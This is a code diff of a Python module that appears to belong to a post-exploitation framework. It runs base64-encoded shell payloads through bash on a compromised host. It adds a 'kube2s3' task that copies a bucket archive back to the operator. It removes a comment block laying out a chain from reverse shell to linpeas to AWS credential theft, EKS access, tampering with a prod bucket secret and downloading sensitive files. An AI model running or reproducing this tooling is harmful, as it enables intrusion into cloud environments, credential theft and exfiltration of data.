@@ -442,28 +442,25 @@ class Module(BaseModule):
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'",
                     cwd="/tmp", timeout=900)
-                log(result)
-                # - reverse shell executes linpeas and pulls back aws credentials
-                # - use credentials to call aws eks list-clusters and find our cluster
-                # - use credentials to call aws eks update-kubeconfig --name=<cluster>
-                # - copy kubeconfig back to attacker
-                # - use local kubectl to execute eks discovery
-                # - run general kubernetes discovery (e.g. pierates or https://github.com/corneliusweig/rakkess)
-                # - discover s3app pod with directory listing and associated aws credentials
-                # - list secrets to discovery BUCKET_NAME secret store
-                # - update BUCKET_NAME value to point to prod
-                # - proxy local connection to s3app to enumerate files
-                # - download sensitive files
-                # - ** optional **
-                # - start privileged pod to mount node filesystem
-                # - start second reverse shell with nmap and linpeas.sh from node
-                # - exec into s3app to obtain a session for the role used in the pod
-                # - abuse this as necessary
+            elif task_name == "kube2s3":
+                with open(f"{task_name}.sh", 'rb') as f:
+                    payload = base64.b64encode(f.read())
+
+                session.log("running scan payload...")
                 result = session.platform.run(
-                    "touch /tmp/kubeshell.txt",
+                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_kube2s3 | base64 -d | /bin/bash'",
                     cwd="/tmp", timeout=900)
-                log(f'Result: {result.returncode}')
-                pass
+                session.log(result)
+
+                files = ["/tmp/kube_bucket.tgz"]
+                file_list = ", ".join(files)
+                session.log(
+                    f"copying scan results: {file_list}...")
+                for file in files:
+                    with session.platform.open(file, 'rb') as f1:
+                        with open(f'/tmp/{os.path.basename(file)}', 'wb') as f2:
+                            f2.write(f1.read())
+                session.log("done")
             else:
                 # update to add 15 minute timeout
                 result = session.platform.run(
